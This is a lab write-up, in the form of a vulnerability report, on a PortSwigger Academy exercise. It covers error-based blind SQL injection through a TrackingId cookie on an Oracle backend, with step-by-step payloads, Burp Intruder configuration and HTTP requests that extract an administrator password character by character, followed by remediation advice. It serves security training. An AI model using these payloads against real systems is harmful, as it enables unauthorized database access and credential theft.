
---

# Blind SQL Injection in TrackingId Cookie allows Administrator Account Compromise through Conditional Errors

## 1. Executive Summary

A blind SQL injection vulnerability exists in the application's `TrackingId` cookie, allowing an attacker to inject SQL expressions into a backend Oracle database query. Although query results are not directly returned, the attacker can deliberately trigger a database error when a specified condition is true, using the difference between HTTP 500 and HTTP 200 responses as an oracle to enumerate the administrator's password.

## 2. Vulnerability Details

- **Vulnerability Type:** Blind SQL Injection — Conditional Error-Based SQL Injection
    
- **Target Endpoint/URL:** `/`
    
- **Affected Parameter(s):** `TrackingId` cookie
    
- **Authentication Level Required:** Unauthenticated
    
- **Backend Database:** Oracle
    

The application processes the `TrackingId` cookie as part of a SQL query without properly parameterizing the value.

The injection can be used to execute conditional expressions such as:

```
CASE
    WHEN (<condition>)
    THEN TO_CHAR(1/0)
    ELSE ''
END
```

When the condition is true, `1/0` causes an Oracle database error, resulting in an HTTP **500** response.

When the condition is false, the expression evaluates normally and the application returns an HTTP **200** response.

This creates an error-based Boolean oracle:

```
Condition TRUE  → SQL error → HTTP 500
Condition FALSE → No error  → HTTP 200
```

## 3. Steps to Reproduce (STR)

### Step 1 — Confirm an observable error condition

1. Access the PortSwigger lab's front page.
    
2. Intercept the request using Burp Suite.
    
3. Locate the `TrackingId` cookie.
    

For example:

```
Cookie: TrackingId=xyz
```

4. Append a single quote:
    

```
TrackingId=xyz'
```

5. Forward the request.
    
6. Observe that an error is returned.
    
7. Change the cookie to two quotes:
    

```
TrackingId=xyz''
```

8. Forward the request.
    
9. Observe that the error disappears.
    
10. This indicates that the injected quote is affecting the SQL syntax.
    

### Step 2 — Confirm SQL injection and identify the database

11. Test a syntactically valid SQL expression:
    

```
TrackingId=xyz'||(SELECT '')||'
```

12. If an error occurs, test the Oracle `dual` table:
    

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

13. Observe that the error disappears.
    
14. This strongly indicates that the backend is using Oracle, because Oracle requires a `FROM` clause in `SELECT` statements.
    
15. Confirm that the expression is actually being executed as SQL by querying a nonexistent table:
    

```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

16. Observe that an error is returned.
    
17. This confirms that the injected expression is being processed by the backend SQL engine.
    

### Step 3 — Confirm the `users` table exists

18. Use:
    

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

19. Forward the request.
    
20. Observe that no error occurs.
    
21. This indicates that the `users` table exists and contains at least one row.
    

The `ROWNUM = 1` condition ensures that the subquery returns at most one row.

### Step 4 — Create a conditional database error

22. Test a condition that is known to be true:
    

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

23. Forward the request.
    
24. Observe an error/HTTP 500 response.
    
25. Now test a false condition:
    

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

26. Forward the request.
    
27. Observe that the error disappears and the application responds normally.
    
28. This confirms that a database error can be conditionally triggered based on whether an SQL expression evaluates to true.
    

### Step 5 — Confirm the administrator account

29. Test whether the `administrator` user exists:
    

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

30. Forward the request.
    
31. Observe the error response.
    
32. This confirms that a row for `administrator` exists.
    

### Step 6 — Determine the password length

33. Test whether the administrator password is longer than one character:
    

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

34. If an HTTP 500 response occurs, the condition is true.
    
35. Continue testing increasing lengths:
    

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

36. Continue until the error disappears.
    
37. When `LENGTH(password)>N` is false, the password length has been reached.
    
38. In this lab, the administrator password is **20 characters long**.
    

### Step 7 — Extract individual password characters

39. Send the request to Burp Intruder.
    
40. Configure the cookie to test the first character:
    

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

41. Place Burp Intruder payload markers around the candidate character:
    

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

42. Configure **Payload type** as `Simple list`.
    
43. Add the possible characters:
    

```
a-z
0-9
```

44. Launch the Intruder attack.
    
45. Examine the HTTP status codes in the results.
    
46. The correct character causes the conditional `1/0` expression to execute.
    
47. Therefore, the correct character produces an **HTTP 500** response.
    
48. Incorrect characters produce the normal **HTTP 200** response.
    

### Step 8 — Extract the remaining characters

49. Change the `SUBSTR()` offset from `1` to `2`:
    

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

50. Run the Intruder attack again.
    
51. Identify the payload that produces HTTP 500.
    
52. Record that character as the second password character.
    
53. Repeat the process for offsets `3` through `20`.
    
54. Combine the extracted characters to reconstruct the complete administrator password.
    

### Step 9 — Authenticate as administrator

55. Click **My account** in the browser.
    
56. Open the login page.
    
57. Enter:
    

```
Username: administrator
Password: <extracted-password>
```

58. Submit the credentials.
    
59. Confirm successful authentication as the administrator.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

#### Confirm Oracle SQL execution

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'
```

The lack of an error indicates that the Oracle-specific expression is syntactically valid.

Testing a nonexistent table:

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

produces a database error, confirming SQL execution.

#### Conditional error

True condition:

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Response:

```
HTTP/1.1 500 Internal Server Error
```

False condition:

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Response:

```
HTTP/1.1 200 OK
```

This establishes the error-based Boolean oracle.

#### Password character extraction

For the first character:

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Burp Intruder substitutes the marked character with `a-z` and `0-9`.

Conceptually:

```
SELECT CASE
    WHEN SUBSTR(password,1,1) = 'a'
    THEN TO_CHAR(1/0)
    ELSE ''
END
FROM users
WHERE username='administrator';
```

If `a` is the correct first character:

```
Correct character → condition TRUE → 1/0 → HTTP 500
```

If `a` is incorrect:

```
Incorrect character → condition FALSE → '' → HTTP 200
```

The same technique is repeated for positions `2` through `20`.

### Evidence (Screenshots/Video)



## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can exploit error-based blind SQL injection to execute conditional SQL expressions and infer database information from HTTP response behavior. In this lab, the attacker can confirm the existence of the `users` table and administrator account, determine the password length, extract every password character, and reconstruct the administrator password.
    
- **Business Impact:** Successful exploitation results in compromise of a privileged application account. An attacker who obtains administrator credentials may gain unauthorized access to sensitive information and privileged application functionality.
    

The key security issue is that **database errors are externally observable and controllable through attacker-supplied SQL conditions**, creating a reliable Boolean oracle even though the application does not directly display query results.

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for all database operations involving user-controlled input. The `TrackingId` cookie must be treated strictly as data and must never be concatenated into SQL statements.
    

Example:

```
cursor.execute(
    "SELECT ... WHERE tracking_id = :tracking_id",
    {"tracking_id": tracking_id}
)
```

Additional defenses include:

- Use prepared statements/parameterized queries.
    
- Never concatenate cookies or other user-controlled values into SQL.
    
- Apply least-privilege permissions to the database account.
    
- Do not expose database errors to clients.
    
- Return consistent error responses regardless of internal database failures.
    
- Store passwords using strong, salted password-hashing algorithms.
    
- Implement rate limiting and monitoring for repeated suspicious requests.
    
- Use generic application-level error handling instead of propagating database exceptions.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - CWE-209: Generation of Error Message Containing Sensitive Information
        
    - PortSwigger Web Security Academy — Blind SQL Injection